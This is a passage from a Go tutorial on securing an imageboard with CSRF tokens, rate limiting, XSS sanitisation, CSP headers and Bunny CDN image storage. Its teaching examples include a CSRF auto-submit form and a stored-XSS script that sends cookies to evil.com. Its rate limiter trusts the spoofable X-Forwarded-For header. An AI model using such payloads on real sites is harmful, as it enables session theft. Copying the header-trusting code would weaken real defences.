# Tutorial 2: Major Security & Architecture Improvements

**Estimated Time:** 5-7 hours
**Difficulty:** Intermediate to Advanced
**Prerequisites:** Tutorial 1 completed, understanding of HTTP, databases, and cloud storage

This tutorial covers significant architectural improvements that will make your application production-ready: CSRF protection, rate limiting, XSS protection, migrating images to Bunny CDN, proper concurrency handling, and restructuring your data layer.

---

## Table of Contents

1. [CSRF Protection (45 min)](#1-csrf-protection)
2. [Rate Limiting (60 min)](#2-rate-limiting)
3. [XSS Protection (45 min)](#3-xss-protection)
4. [Migrate Images to Bunny CDN (90 min)](#4-migrate-images-to-bunny-cdn)
5. [Proper Concurrency & Timeout Handling (60 min)](#5-proper-concurrency--timeout-handling)
6. [Migrate to PostgreSQL-Primary Architecture (120 min)](#6-migrate-to-postgresql-primary-architecture)

---

## 1. CSRF Protection

### Why This Matters

**Cross-Site Request Forgery (CSRF)** allows attackers to perform actions as a logged-in user without their knowledge.

**Attack Example:**

1. Admin logs into your imageboard at `yoursite.com`
2. Admin visits `evil.com` while still logged in
3. `evil.com` contains:
   ```html
   <form action="https://yoursite.com/admin/delete-board" method="POST">
     <input type="hidden" name="board_id" value="1">
   </form>
   <script>document.forms[0].submit();</script>
   ```
4. Browser automatically includes admin's session cookie
5. Board gets deleted without admin's knowledge

**Solution:** CSRF tokens - unpredictable values that attackers can't forge.

### Step 1: Install CSRF Library

```bash
go get github.com/gorilla/csrf
```

### Step 2: Add CSRF Middleware

Create a new file `middleware.go`:

```go
package main

import (
	"net/http"
	"os"

	"github.com/gorilla/csrf"
)

// SetupCSRF configures CSRF protection middleware
func SetupCSRF() func(http.Handler) http.Handler {
	// In production, generate a random 32-byte key and store in environment
	// For development, use a fixed key (replace this in production!)
	csrfKey := []byte(os.Getenv("CSRF_KEY"))
	if len(csrfKey) != 32 {
		// Development fallback - NEVER use this in production
		csrfKey = []byte("32-byte-long-auth-key-for-csrf!!")
	}

	// Configure CSRF middleware
	csrfMiddleware := csrf.Protect(
		csrfKey,
		csrf.Secure(os.Getenv("ENVIRONMENT") == "production"), // Only require HTTPS in production
		csrf.SameSite(csrf.SameSiteLaxMode),                   // Additional protection
		csrf.ErrorHandler(http.HandlerFunc(csrfErrorHandler)), // Custom error page
	)

	return csrfMiddleware
}

// csrfErrorHandler shows a friendly error when CSRF validation fails
func csrfErrorHandler(w http.ResponseWriter, r *http.Request) {
	w.WriteHeader(http.StatusForbidden)
	w.Write([]byte(`
		<!DOCTYPE html>
		<html>
		<head><title>Security Error</title></head>
		<body>
			<h1>Security Error</h1>
			<p>Your request could not be completed due to a security check failure.</p>
			<p>This usually happens when:</p>
			<ul>
				<li>Your session expired</li>
				<li>You submitted a form multiple times</li>
				<li>You opened the form in multiple tabs</li>
			</ul>
			<p><a href="/">Return to home</a></p>
		</body>
		</html>
	`))
}
```

### Step 3: Apply CSRF Middleware to Routes

**Update main.go:**

```go
func main() {
	// ... existing initialization code ...

	// Set up CSRF protection
	csrfMiddleware := SetupCSRF()

	// Wrap your HTTP handler with CSRF protection
	handler := csrfMiddleware(http.DefaultServeMux)

	// ... existing route setup ...

	// Start HTTP server with CSRF-protected handler
	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}

	log.Printf("Server starting on http://localhost:%s", port)
	log.Fatal(http.ListenAndServe(":"+port, handler)) // Use wrapped handler
}
```

### Step 4: Add CSRF Tokens to Templates

**Update templates/base.html** - Add CSRF token to all forms:

```html
<!DOCTYPE html>
<html>
<head>
    <title>{{.Title}}</title>
    <meta charset="UTF-8">
    <!-- Add this line to pass CSRF token to all templates -->
    {{ if .CSRFToken }}<meta name="csrf-token" content="{{ .CSRFToken }}">{{ end }}
</head>
<body>
    {{template "content" .}}
</body>
</html>
```

**Update every form template** (board.html, thread.html, admin templates):

**Before:**
```html
<form action="/new-thread" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="board_id" value="{{.Board.ID}}">
    <!-- form fields -->
</form>
```

**After:**
```html
<form action="/new-thread" method="POST" enctype="multipart/form-data">
    {{ .CSRFField }}
    <input type="hidden" name="board_id" value="{{.Board.ID}}">
    <!-- form fields -->
</form>
```

### Step 5: Pass CSRF Token in Handlers

**Update RenderTemplate function in handlers.go:**

```go
// RenderTemplate renders a template with given data
func RenderTemplate(w http.ResponseWriter, r *http.Request, name string, data interface{}) {
	tmpl, ok := templates[name]
	if !ok {
		http.Error(w, "Template not found", http.StatusInternalServerError)
		return
	}

	// Add CSRF token to data
	// Convert data to map so we can add the token
	dataMap, ok := data.(map[string]interface{})
	if !ok {
		// If data isn't a map, create one
		dataMap = map[string]interface{}{"Data": data}
	}

	// Add CSRF field for forms
	dataMap["CSRFField"] = csrf.TemplateField(r)
	dataMap["CSRFToken"] = csrf.Token(r)

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	err := tmpl.ExecuteTemplate(w, "base", dataMap)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
	}
}
```

**Update all handler calls** to include request:

```go
// Before:
RenderTemplate(w, "home", data)

// After:
RenderTemplate(w, r, "home", data)
```

**Add import to handlers.go:**

```go
import (
	"github.com/gorilla/csrf"
	// ... existing imports
)
```

### Step 6: Generate CSRF Key

```bash
# Generate a secure random 32-byte key
openssl rand -base64 32

# Add to .env file:
echo "CSRF_KEY=<your-generated-key-here>" >> .env
```

### Step 7: Test CSRF Protection

**Test 1: Normal form submission should work**
```bash
# Start the app
go run .

# Create a new thread - should work normally
```

**Test 2: Missing CSRF token should fail**
```bash
# Try to POST without CSRF token using curl
curl -X POST http://localhost:8080/new-thread \
  -d "board_id=1&title=Test&content=Test" \
  -H "Cookie: session=your-session-cookie"

# Should get: 403 Forbidden with security error page
```

**Test 3: Invalid CSRF token should fail**
```bash
# Try to POST with wrong CSRF token
curl -X POST http://localhost:8080/new-thread \
  -d "board_id=1&title=Test&content=Test&gorilla.csrf.Token=invalid" \
  -H "Cookie: session=your-session-cookie"

# Should get: 403 Forbidden
```

### Understanding CSRF Tokens

**How it works:**

1. Server generates unique token per session
2. Token embedded in every form as hidden field
3. On POST, server validates token matches session
4. Attacker on `evil.com` can't read your session's token (Same-Origin Policy)
5. Attacker can't forge valid requests

**Token lifecycle:**

```
User loads form → Server generates token → Token in hidden field
                                          ↓
User submits form → Browser sends token → Server validates
                                          ↓
                              Match? → Allow | Reject (403)
```

### What You Learned

✅ How CSRF attacks work and why they're dangerous
✅ How CSRF tokens prevent unauthorized requests
✅ How to implement CSRF protection using gorilla/csrf
✅ How to pass data through middleware to templates
✅ The importance of Same-Origin Policy in web security

---

## 2. Rate Limiting

### Why This Matters

**Without rate limiting:**
- Spammers can create thousands of posts instantly
- Attackers can brute force admin passwords
- Bots can scrape your entire site in seconds
- Your database and Redis get overwhelmed

**With rate limiting:**
- Maximum X requests per IP per time period
- Protects against spam and abuse
- Prevents resource exhaustion
- Makes attacks economically infeasible

### Step 1: Install Rate Limiting Library

```bash
go get golang.org/x/time/rate
```

### Step 2: Create Rate Limiter

**Add to middleware.go:**

```go
import (
	"net"
	"net/http"
	"sync"
	"time"

	"golang.org/x/time/rate"
)

// IPRateLimiter manages rate limits per IP address
type IPRateLimiter struct {
	ips map[string]*rate.Limiter
	mu  *sync.RWMutex
	r   rate.Limit // requests per second
	b   int        // burst size
}

// NewIPRateLimiter creates a new rate limiter
func NewIPRateLimiter(r rate.Limit, b int) *IPRateLimiter {
	return &IPRateLimiter{
		ips: make(map[string]*rate.Limiter),
		mu:  &sync.RWMutex{},
		r:   r,
		b:   b,
	}
}

// GetLimiter returns the rate limiter for a given IP
func (i *IPRateLimiter) GetLimiter(ip string) *rate.Limiter {
	i.mu.Lock()
	defer i.mu.Unlock()

	limiter, exists := i.ips[ip]
	if !exists {
		limiter = rate.NewLimiter(i.r, i.b)
		i.ips[ip] = limiter
	}

	return limiter
}

// CleanupOldEntries removes inactive IPs from memory
// Call this periodically to prevent memory leaks
func (i *IPRateLimiter) CleanupOldEntries() {
	i.mu.Lock()
	defer i.mu.Unlock()

	// In production, track last access time and remove old entries
	// For simplicity, we'll just clear if map gets too large
	if len(i.ips) > 10000 {
		i.ips = make(map[string]*rate.Limiter)
	}
}

// Global rate limiters for different endpoints
var (
	// General browsing: 60 requests per minute (1 per second sustained)
	generalLimiter = NewIPRateLimiter(rate.Limit(1), 10)

	// Post creation: 5 posts per minute
	postLimiter = NewIPRateLimiter(rate.Every(12*time.Second), 5)

	// Login attempts: 5 attempts per 5 minutes
	loginLimiter = NewIPRateLimiter(rate.Every(1*time.Minute), 5)
)

// RateLimitMiddleware applies rate limiting to requests
func RateLimitMiddleware(limiter *IPRateLimiter) func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			// Get client IP
			ip := getIPAddress(r)

			// Get limiter for this IP
			l := limiter.GetLimiter(ip)

			// Check if request is allowed
			if !l.Allow() {
				http.Error(w, "Rate limit exceeded. Please slow down.", http.StatusTooManyRequests)
				log.Printf("Rate limit exceeded for IP: %s on %s", ip, r.URL.Path)
				return
			}

			// Request allowed, proceed
			next.ServeHTTP(w, r)
		})
	}
}

// Helper function to get IP address (you already have this in handlers.go)
func getIPAddress(r *http.Request) string {
	ip := r.Header.Get("X-Forwarded-For")
	if ip != "" {
		ips := strings.Split(ip, ",")
		return strings.TrimSpace(ips[0])
	}

	ip, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}

	return ip
}
```

### Step 3: Apply Rate Limiting to Specific Routes

**Update main.go:**

```go
func main() {
	// ... existing initialization ...

	// Set up CSRF protection
	csrfMiddleware := SetupCSRF()

	// Set up periodic cleanup for rate limiters
	go func() {
		ticker := time.NewTicker(15 * time.Minute)
		defer ticker.Stop()
		for range ticker.C {
			generalLimiter.CleanupOldEntries()
			postLimiter.CleanupOldEntries()
			loginLimiter.CleanupOldEntries()
		}
	}()

	// ... static file handlers ...

	// Auth routes (with login rate limiting)
	http.Handle("/login", RateLimitMiddleware(loginLimiter)(http.HandlerFunc(LoginHandler)))
	http.HandleFunc("/logout", LogoutHandler)

	// Admin routes (no extra rate limiting, already protected by auth)
	http.HandleFunc("/admin", AdminHomeHandler)
	// ... other admin routes ...

	// Post creation routes (with strict rate limiting)
	http.Handle("/new-thread", RateLimitMiddleware(postLimiter)(http.HandlerFunc(NewThreadHandler)))
	http.Handle("/new-post", RateLimitMiddleware(postLimiter)(http.HandlerFunc(NewPostHandler)))

	// Apply general rate limiting to catch-all route
	http.Handle("/", RateLimitMiddleware(generalLimiter)(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// ... existing home/board/thread routing ...
	})))

	// Wrap everything with CSRF protection
	handler := csrfMiddleware(http.DefaultServeMux)

	// Start server
	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}

	log.Printf("Server starting on http://localhost:%s", port)
	log.Fatal(http.ListenAndServe(":"+port, handler))
}
```

### Step 4: Add Rate Limit Headers (Best Practice)

**Update RateLimitMiddleware:**

```go
func RateLimitMiddleware(limiter *IPRateLimiter) func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			ip := getIPAddress(r)
			l := limiter.GetLimiter(ip)

			// Reserve a token (similar to Allow but gives us more info)
			reservation := l.Reserve()
			if !reservation.OK() {
				http.Error(w, "Rate limit exceeded. Please slow down.", http.StatusTooManyRequests)
				return
			}

			delay := reservation.Delay()
			if delay > 0 {
				// Client is being rate limited
				reservation.Cancel() // Don't consume the token
				w.Header().Set("Retry-After", fmt.Sprintf("%.0f", delay.Seconds()))
				http.Error(w, "Rate limit exceeded. Please slow down.", http.StatusTooManyRequests)
				log.Printf("Rate limit exceeded for IP: %s on %s (retry after %.0fs)", ip, r.URL.Path, delay.Seconds())
				return
			}

			// Add rate limit headers to response (helps clients know their limits)
			// Note: This is informational, not exact due to token bucket algorithm
			w.Header().Set("X-RateLimit-Limit", fmt.Sprintf("%v", limiter.b))

			next.ServeHTTP(w, r)
		})
	}
}
```

### Step 5: Test Rate Limiting

**Test 1: Normal usage should work**
```bash
# Make a few requests - should work fine
curl http://localhost:8080/
curl http://localhost:8080/
curl http://localhost:8080/
```

**Test 2: Rapid requests should be blocked**
```bash
# Make 20 rapid requests
for i in {1..20}; do
  curl http://localhost:8080/ -w "\nStatus: %{http_code}\n"
done

# First 10 should return 200
# After that should return 429 (Too Many Requests)
```

**Test 3: Post rate limiting**
```bash
# Try to create 10 posts rapidly (should block after 5)
for i in {1..10}; do
  curl -X POST http://localhost:8080/new-thread \
    -F "board_id=1" \
    -F "title=Test $i" \
    -F "content=Content $i" \
    -F "g-recaptcha-response=test"
  echo "Request $i completed"
  sleep 1
done

# Should see 429 errors after 5 posts
```

### Understanding Token Bucket Algorithm

Rate limiting uses a "token bucket" algorithm:

```
Bucket Capacity: 10 tokens (burst size)
Refill Rate: 1 token per second

Time | Tokens | Request | Result
-----|--------|---------|--------
0s   | 10     | 1 req   | ✓ Allow (9 tokens left)
1s   | 10     | 1 req   | ✓ Allow (9 tokens left)
1s   | 9      | 10 reqs | ✓ Allow 9, ✗ Deny 1
2s   | 1      | 1 req   | ✓ Allow (refilled 1 token)
3s   | 2      | 5 reqs  | ✓ Allow 2, ✗ Deny 3
```

**Parameters:**
- `rate.Limit(1)` = 1 token per second
- `burst: 10` = can accumulate up to 10 tokens
- `rate.Every(12*time.Second)` = 1 token every 12 seconds (5 per minute)

### Advanced: Redis-Based Rate Limiting

For multiple servers, use Redis instead of in-memory maps:

```go
func CheckRateLimit(ip string, limit int, window time.Duration) (bool, error) {
	key := fmt.Sprintf("ratelimit:%s", ip)

	// Increment counter
	count, err := rdb.Incr(ctx, key).Result()
	if err != nil {
		return false, err
	}

	// Set expiration on first request
	if count == 1 {
		rdb.Expire(ctx, key, window)
	}

	// Check if over limit
	return count <= int64(limit), nil
}
```

### What You Learned

✅ Why rate limiting is essential for production applications
✅ How token bucket algorithm works
✅ How to implement per-IP rate limiting in Go
✅ How to apply different limits to different endpoints
✅ Best practices for rate limit HTTP headers
✅ How to prevent memory leaks in long-running servers

---

## 3. XSS Protection

### Why This Matters

**Cross-Site Scripting (XSS)** allows attackers to inject malicious scripts into your pages.

**Attack Example:**

User creates a post with content:
```html
Hey check this out! <script>
  // Steal session cookie
  fetch('https://evil.com/steal?cookie=' + document.cookie);

  // Delete all threads
  fetch('/admin/delete-board', {method: 'POST', body: 'board_id=1'});
</script>
```

When admin views the thread, the script executes as the admin!

**Current Protection:** Go's `html/template` package escapes HTML by default (good!), but you should add defense-in-depth.

### Step 1: Install Sanitization Library

```bash
go get github.com/microcosm-cc/bluemonday
```

### Step 2: Create Content Sanitizer

Create new file `sanitize.go`:

```go
package main

import (
	"github.com/microcosm-cc/bluemonday"
	"html"
)

var (
	// StrictPolicy strips ALL HTML tags
	StrictPolicy = bluemonday.StrictPolicy()

	// UGCPolicy allows user-generated content with safe formatting
	// Allows: bold, italic, underline, links, lists
	UGCPolicy = bluemonday.UGCPolicy()
)

// SanitizeContent removes dangerous HTML from user input
func SanitizeContent(input string) string {
	// First, escape any HTML entities
	escaped := html.EscapeString(input)

	// Then run through bluemonday to strip dangerous tags
	// Using StrictPolicy = removes ALL HTML
	sanitized := StrictPolicy.Sanitize(escaped)

	return sanitized
}

// SanitizeContentWithFormatting allows safe HTML formatting
// Use this if you want to support bold, italics, etc.
func SanitizeContentWithFormatting(input string) string {
	// UGCPolicy allows safe tags like <b>, <i>, <a>, <ul>, <li>
	// But blocks <script>, <iframe>, event handlers, etc.
	sanitized := UGCPolicy.Sanitize(input)

	return sanitized
}

// SanitizeTitle sanitizes thread/board titles
func SanitizeTitle(input string) string {
	// Titles should never have HTML
	return StrictPolicy.Sanitize(html.EscapeString(input))
}
```

### Step 3: Apply Sanitization to User Input

**Update NewThreadHandler in handlers.go:**

```go
func NewThreadHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	err := r.ParseMultipartForm(10 << 20)
	if err != nil {
		http.Error(w, "Error parsing form", http.StatusBadRequest)
		return
	}

	boardIDStr := r.FormValue("board_id")
	title := r.FormValue("title")
	content := r.FormValue("content")
	recaptchaResponse := r.FormValue("g-recaptcha-response")

	boardID, err := strconv.Atoi(boardIDStr)
	if err != nil {
		http.Error(w, "Invalid board ID", http.StatusBadRequest)
		return
	}

	// SANITIZE USER INPUT
	title = SanitizeTitle(title)
	content = SanitizeContent(content)

	// Validation
	if title == "" || content == "" {
		http.Error(w, "Title and content are required", http.StatusBadRequest)
		return
	}

	// ... rest of handler ...
}
```

**Update NewPostHandler:**

```go
func NewPostHandler(w http.ResponseWriter, r *http.Request) {
	// ... existing code ...

	threadIDStr := r.FormValue("thread_id")
	content := r.FormValue("content")
	recaptchaResponse := r.FormValue("g-recaptcha-response")

	// SANITIZE USER INPUT
	content = SanitizeContent(content)

	// ... rest of handler ...
}
```

**Update Admin Board Creation (AdminCreateBoardHandler):**

```go
func AdminCreateBoardHandler(w http.ResponseWriter, r *http.Request) {
	// ... auth check ...

	slug := r.FormValue("slug")
	name := r.FormValue("name")
	description := r.FormValue("description")

	// SANITIZE ADMIN INPUT (defense in depth)
	slug = SanitizeTitle(slug)
	name = SanitizeTitle(name)
	description = SanitizeContent(description)

	// ... rest of handler ...
}
```

### Step 4: Add Content Security Policy (CSP) Header

**Add CSP middleware to middleware.go:**

```go
// CSPMiddleware adds Content Security Policy headers
func CSPMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Content Security Policy: controls what resources can load
		csp := []string{
			"default-src 'self'",                    // Only load resources from same origin
			"script-src 'self' 'unsafe-inline' https://www.google.com https://www.gstatic.com", // Allow scripts from self + Google reCAPTCHA
			"style-src 'self' 'unsafe-inline'",      // Allow inline styles (needed for many frameworks)
			"img-src 'self' data: https:",           // Allow images from self, data URIs, and HTTPS
			"font-src 'self'",                       // Fonts from same origin
			"connect-src 'self'",                    // AJAX requests only to same origin
			"frame-src https://www.google.com",      // iframes only for reCAPTCHA
			"object-src 'none'",                     // No Flash, Java, etc.
			"base-uri 'self'",                       // Prevent base tag injection
			"form-action 'self'",                    // Forms can only submit to same origin
		}

		w.Header().Set("Content-Security-Policy", strings.Join(csp, "; "))

		// Additional security headers
		w.Header().Set("X-Content-Type-Options", "nosniff")           // Prevent MIME sniffing
		w.Header().Set("X-Frame-Options", "SAMEORIGIN")               // Prevent clickjacking
		w.Header().Set("X-XSS-Protection", "1; mode=block")           // Enable XSS filter
		w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin") // Control referer header

		next.ServeHTTP(w, r)
	})
}
```

**Apply CSP middleware in main.go:**

```go
func main() {
	// ... initialization ...

	// Layer middlewares (order matters!)
	handler := http.DefaultServeMux
	handler = CSPMiddleware(handler)           // Add security headers
	handler = csrfMiddleware(handler)          // CSRF protection

	// Start server
	log.Fatal(http.ListenAndServe(":"+port, handler))
}
```

### Step 5: Test XSS Protection

**Test 1: Try to inject script tag**
```bash
# Create thread with XSS payload
curl -X POST http://localhost:8080/new-thread \
  -F "board_id=1" \
  -F "title=<script>alert('XSS')</script>" \
  -F "content=<img src=x onerror='alert(1)'>" \
  -F "g-recaptcha-response=test"

# View the thread - script should be escaped/removed
```

**Test 2: Check browser console**
```javascript
// Open browser console on your site
// Try to execute:
document.cookie

// With HttpOnly cookies, this should return empty string or only non-HttpOnly cookies
```

**Test 3: Verify CSP headers**
```bash
curl -I http://localhost:8080/ | grep -i "content-security-policy"

# Should see:
# Content-Security-Policy: default-src 'self'; script-src 'self' ...
```

### Understanding Defense Layers

XSS protection has multiple layers:

```
Layer 1: Input Sanitization (bluemonday)
         ↓
Layer 2: Output Escaping (html/template)
         ↓
Layer 3: Content Security Policy (CSP headers)
         ↓
Layer 4: HttpOnly Cookies (prevent JS access)
```

**Why multiple layers?**
- Defense in depth: if one layer fails, others protect
- Different threats: each layer stops different attacks
- Browser support: older browsers may not support CSP

### Advanced: Implement Markdown Support

Instead of allowing HTML, support Markdown (safer):

```bash
go get github.com/russross/blackfriday/v2
```

```go
import "github.com/russross/blackfriday/v2"

func SanitizeMarkdown(input string) string {
	// Convert Markdown to HTML
	html := blackfriday.Run([]byte(input))

	// Sanitize the resulting HTML
	safe := UGCPolicy.SanitizeBytes(html)

	return string(safe)
}
```

This allows users to format posts with `**bold**`, `*italic*`, etc., without HTML injection risks.

### What You Learned

✅ How XSS attacks work and why they're dangerous
✅ The difference between stored XSS and reflected XSS
✅ How to sanitize user input with bluemonday
✅ How Content Security Policy provides browser-level protection
✅ Why defense-in-depth is important for security
✅ Security headers that every web app should use

---

## 4. Migrate Images to Bunny CDN

### Why This Matters

**Current Problem:** Images stored in Redis

**Issues:**
- **Expensive**: Redis memory costs ~$10/GB/month
- **Volatile**: Redis is designed for caching, not permanent storage
- **Limited**: Redis has size limits (default 512MB strings)
- **Inefficient**: Binary data wastes Redis memory
- **No CDN**: Users far from your server have slow image loads

**Solution:** Bunny CDN Storage

**Benefits:**
- **Cheap**: $0.01/GB/month storage (1000x cheaper than Redis!)
- **Fast**: Global CDN with 96+ locations worldwide
- **Built-in CDN**: No separate CDN setup needed
- **Simple API**: S3-compatible API, easy to use
- **Zero egress fees**: Unlike AWS S3, bandwidth is included
- **Video support**: Can handle video uploads if you expand later

**Cost Comparison:**
- Redis (100GB images): $1,000/month
- Bunny Storage (100GB): $1/month + $0.01/GB bandwidth = ~$2-5/month total
- **Savings: 99.5%+**

### Step 1: Set Up Bunny Storage

1. Sign up at bunny.net
2. Go to "Storage" in the sidebar
3. Click "Add Storage Zone"
4. Choose:
   - Name: `imageboard-images`
   - Region: Pick closest to your users (or multiple regions)
   - Replication: Enable for critical data
5. Create a Pull Zone (CDN):
   - Name: `imageboard-cdn`
   - Origin: Your storage zone
   - Enable "Vary Cache" for better performance
6. Get API credentials:
   - Go to Storage Zone settings
   - Copy the API Key and Storage Zone Name
   - Copy the Pull Zone hostname (e.g., `imageboard-cdn.b-cdn.net`)

### Step 2: Install HTTP Client Library

```bash
go get github.com/bunny-cdn/go-bunny-sdk
```

Or use standard library (we'll do this for learning):

### Step 3: Create Bunny Storage Client

Create new file `bunny_storage.go`:

```go
package main

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net/http"
	"os"
	"path"
	"time"
)

var (
	bunnyStorageZone string
	bunnyAPIKey      string
	bunnyHostname    string
	bunnyClient      *http.Client
)

// InitBunnyStorage initializes Bunny CDN storage client
func InitBunnyStorage() error {
	bunnyStorageZone = os.Getenv("BUNNY_STORAGE_ZONE")
	bunnyAPIKey = os.Getenv("BUNNY_API_KEY")
	bunnyHostname = os.Getenv("BUNNY_HOSTNAME") // e.g., "imageboard-cdn.b-cdn.net"

	if bunnyStorageZone == "" || bunnyAPIKey == "" || bunnyHostname == "" {
		return fmt.Errorf("missing Bunny CDN configuration")
	}

	// Create HTTP client with timeout
	bunnyClient = &http.Client{
		Timeout: 30 * time.Second, // 30 second timeout for uploads
		Transport: &http.Transport{
			MaxIdleConns:        100,
			MaxIdleConnsPerHost: 10,
			IdleConnTimeout:     90 * time.Second,
		},
	}

	log.Printf("Bunny CDN initialized: %s", bunnyHostname)
	return nil
}

// UploadImageToBunny uploads an image to Bunny Storage
// Returns the public CDN URL and any error
func UploadImageToBunny(filename string, data []byte, contentType string) (string, error) {
	// Create context with timeout to prevent hanging
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// Bunny Storage API endpoint
	// Format: https://storage.bunnycdn.com/{storage-zone}/{path}
	uploadURL := fmt.Sprintf("https://storage.bunnycdn.com/%s/%s",
		bunnyStorageZone,
		filename)

	// Create request
	req, err := http.NewRequestWithContext(ctx, "PUT", uploadURL, bytes.NewReader(data))
	if err != nil {
		return "", fmt.Errorf("failed to create upload request: %w", err)
	}

	// Add required headers
	req.Header.Set("AccessKey", bunnyAPIKey)
	req.Header.Set("Content-Type", contentType)

	// Upload to Bunny
	resp, err := bunnyClient.Do(req)
	if err != nil {
		return "", fmt.Errorf("failed to upload to Bunny: %w", err)
	}
	defer resp.Body.Close()

	// Check response
	if resp.StatusCode != http.StatusCreated && resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("bunny upload failed with status %d: %s", resp.StatusCode, string(body))
	}

	// Return public CDN URL
	publicURL := fmt.Sprintf("https://%s/%s", bunnyHostname, filename)

	return publicURL, nil
}

// UploadImageToBunnyAsync uploads image in background
// Returns immediately with a channel that will receive the URL or error
func UploadImageToBunnyAsync(filename string, data []byte, contentType string) <-chan ImageUploadResult {
	resultChan := make(chan ImageUploadResult, 1)

	go func() {
		url, err := UploadImageToBunny(filename, data, contentType)
		resultChan <- ImageUploadResult{
			URL:   url,
			Error: err,
		}
		close(resultChan)
	}()

	return resultChan
}

// ImageUploadResult holds the result of an async image upload
type ImageUploadResult struct {
	URL   string
	Error error
}

// DeleteImageFromBunny deletes an image from Bunny Storage
func DeleteImageFromBunny(filename string) error {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	deleteURL := fmt.Sprintf("https://storage.bunnycdn.com/%s/%s",
		bunnyStorageZone,
		filename)

	req, err := http.NewRequestWithContext(ctx, "DELETE", deleteURL, nil)
	if err != nil {
		return fmt.Errorf("failed to create delete request: %w", err)
	}

	req.Header.Set("AccessKey", bunnyAPIKey)

	resp, err := bunnyClient.Do(req)
	if err != nil {
		return fmt.Errorf("failed to delete from Bunny: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusNoContent {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("bunny delete failed with status %d: %s", resp.StatusCode, string(body))
	}

	return nil
}

// GetImageURL returns the public CDN URL for an image
func GetImageURL(filename string) string {
	return fmt.Sprintf("https://%s/%s", bunnyHostname, filename)
}

// PurgeImageCache purges an image from Bunny CDN cache
// Use this after deleting or updating an image
func PurgeImageCache(filename string) error {
	// Bunny Purge API endpoint
	purgeURL := fmt.Sprintf("https://api.bunny.net/purge?url=https://%s/%s",
		bunnyHostname,
		filename)

	req, err := http.NewRequest("POST", purgeURL, nil)
	if err != nil {
		return err
	}

	req.Header.Set("AccessKey", bunnyAPIKey)

	resp, err := bunnyClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	return nil
}
```

### Step 4: Update Environment Configuration

Add to `.env`:

```bash
# Bunny CDN Configuration
BUNNY_STORAGE_ZONE=imageboard-images
BUNNY_API_KEY=your_api_key_here
BUNNY_HOSTNAME=imageboard-cdn.b-cdn.net
```

### Step 5: Update main.go

```go
func main() {
	LoadEnv()

	// Initialize PostgreSQL
	err := InitDB()
	if err != nil {
		log.Fatalf("Failed to connect to PostgreSQL: %v", err)
	}

	// Initialize Redis
	err = InitRedis()
	if err != nil {
		log.Fatalf("Failed to connect to Redis: %v", err)
	}

	// Initialize Bunny CDN
	err = InitBunnyStorage()
	if err != nil {
		log.Fatalf("Failed to initialize Bunny CDN: %v", err)
	}

	// ... rest of main ...
}
```

### Step 6: Update Image Upload Handlers (Synchronous Version)

**Update NewThreadHandler in handlers.go:**

```go
// Handle file upload
imagePath := ""
file, handler, err := r.FormFile("image")
if err == nil && handler != nil {
    defer file.Close()

    // Validate the image
    err = ValidateImage(file, handler)
    if err != nil {
        http.Error(w, "Invalid image file: "+err.Error(), http.StatusBadRequest)
        return
    }

    // Read file data
    buffer := make([]byte, handler.Size)
    _, err := file.Read(buffer)
    if err != nil {
        http.Error(w, "Error reading uploaded file", http.StatusInternalServerError)
        return
    }

    // Determine content type
    contentType := "image/jpeg"
    if bytes.HasPrefix(buffer, []byte{0x89, 0x50, 0x4E, 0x47}) {
        contentType = "image/png"
    } else if bytes.HasPrefix(buffer, []byte{0x47, 0x49, 0x46}) {
        contentType = "image/gif"
    }

    // Generate unique filename
    safeFilename := filepath.Base(handler.Filename)
    filename := fmt.Sprintf("%d_%s", time.Now().UnixNano(), safeFilename)

    // Upload to Bunny CDN
    imageURL, err := UploadImageToBunny(filename, buffer, contentType)
    if err != nil {
        log.Printf("Error uploading to Bunny CDN: %v", err)
        http.Error(w, "Error storing image", http.StatusInternalServerError)
        return
    }

    imagePath = imageURL // Store full CDN URL
}
```

### Step 7: Better Approach - Async Upload with Progress

**The problem with synchronous uploads:**
- User waits for entire upload to complete
- If upload is slow, request might timeout
- One slow upload blocks the handler

**Better solution: Async upload**

Create `async_upload.go`:

```go
package main

import (
	"sync"
	"time"
)

// UploadTask represents a pending image upload
type UploadTask struct {
	ID          string
	Filename    string
	Status      string // "pending", "uploading", "complete", "failed"
	Progress    int    // 0-100
	URL         string
	Error       string
	CreatedAt   time.Time
	CompletedAt time.Time
}

// UploadManager manages async image uploads
type UploadManager struct {
	tasks map[string]*UploadTask
	mu    sync.RWMutex
}

var uploadManager = &UploadManager{
	tasks: make(map[string]*UploadTask),
}

// CreateUploadTask creates a new upload task
func (um *UploadManager) CreateUploadTask(filename string) string {
	um.mu.Lock()
	defer um.mu.Unlock()

	taskID := fmt.Sprintf("%d", time.Now().UnixNano())

	task := &UploadTask{
		ID:        taskID,
		Filename:  filename,
		Status:    "pending",
		Progress:  0,
		CreatedAt: time.Now(),
	}

	um.tasks[taskID] = task

	return taskID
}

// GetUploadTask retrieves an upload task
func (um *UploadManager) GetUploadTask(taskID string) (*UploadTask, bool) {
	um.mu.RLock()
	defer um.mu.RUnlock()

	task, exists := um.tasks[taskID]
	return task, exists
}

// UpdateTaskStatus updates task status
